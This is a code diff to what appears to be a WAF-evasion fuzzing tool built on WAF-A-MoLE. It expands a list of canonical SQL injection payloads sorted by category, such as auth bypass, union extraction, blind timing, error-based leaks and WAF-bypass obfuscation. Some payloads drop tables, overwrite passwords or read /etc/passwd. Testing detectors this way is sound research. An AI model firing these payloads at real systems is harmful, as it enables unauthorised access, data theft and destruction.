@@ -47,24 +47,51 @@ from wafamole.payloadfuzzer.sqlfuzzer import SqlFuzzer
 
 
 # ============================================================
-# Canonical SQLi payloads
+# Canonical SQLi payloads (curated from SecLists + PayloadsAllTheThings)
+# Covers 8 categories of SQL injection: auth bypass, tautology, union,
+# stacked queries, time-based blind, boolean blind, error-based, polyglot.
 # ============================================================
 CANONICAL_PAYLOADS = [
-    "1' OR '1'='1",
-    "1' OR '1'='1' -- ",
-    "' UNION SELECT NULL,NULL,NULL -- ",
-    "1; DROP TABLE users -- ",
-    "1' AND 1=CONVERT(int, (SELECT @@version)) -- ",
-    "1' AND SLEEP(5) -- ",
-    "1' OR ASCII(SUBSTRING(database(),1,1))>64 -- ",
+    # === Auth bypass ===
     "admin' -- ",
-    "1 OR 1=1",
-    "' OR 1=1 LIMIT 1 -- ",
-    "1 UNION SELECT user,password FROM users -- ",
-    "1' OR EXISTS(SELECT * FROM users WHERE username='admin') -- ",
-    "1' AND (SELECT COUNT(*) FROM users) > 0 -- ",
+    "admin' #",
+    "admin' or '1'='1' -- ",
+    "admin') or ('1'='1' -- ",
+    "' OR 1=1 -- ",
+    # === Tautology (various quoting / comment styles) ===
+    "1' OR '1'='1",
+    "1\") or (\"1\"=\"1",
+    "1' OR 1=1#",
+    "' or true -- ",
     "1') OR ('1'='1",
-    "1 AND BENCHMARK(1000000, MD5('test'))",
+    # === Union-based (data extraction) ===
+    "1' UNION SELECT NULL,NULL,NULL -- ",
+    "' UNION ALL SELECT user,password FROM users -- ",
+    "1') UNION SELECT NULL,version() -- ",
+    "-1 UNION SELECT 1,2,3,4 -- ",
+    # === Stacked queries (multi-statement) ===
+    "1; DROP TABLE users -- ",
+    "'; UPDATE users SET password='x' WHERE 1=1 -- ",
+    # === Time-based blind ===
+    "1' AND SLEEP(5) -- ",
+    "1' AND BENCHMARK(10000000, MD5('a')) -- ",
+    "1') OR pg_sleep(5) -- ",
+    "1; WAITFOR DELAY '0:0:5' -- ",
+    # === Boolean blind / data extraction ===
+    "1' AND ASCII(SUBSTRING(database(),1,1)) > 64 -- ",
+    "1' AND (SELECT COUNT(*) FROM users) > 0 -- ",
+    "1' AND SUBSTRING(@@version,1,1)='5' -- ",
+    # === Error-based info leak ===
+    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, USER())) -- ",
+    "1' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1) -- ",
+    # === Out-of-band / file access ===
+    "1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL -- ",
+    "1' INTO OUTFILE '/tmp/x.txt' -- ",
+    # === Multi-DB polyglot ===
+    "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+    # === WAF-bypass tricks (already obfuscated forms) ===
+    "1' /*!OR*/ '1'='1",
+    "1' UnIoN/**/SeLeCt NULL,NULL,NULL -- ",
 ]
 
 # Deployment templates (mirrors src/preprocessing or system deployment)
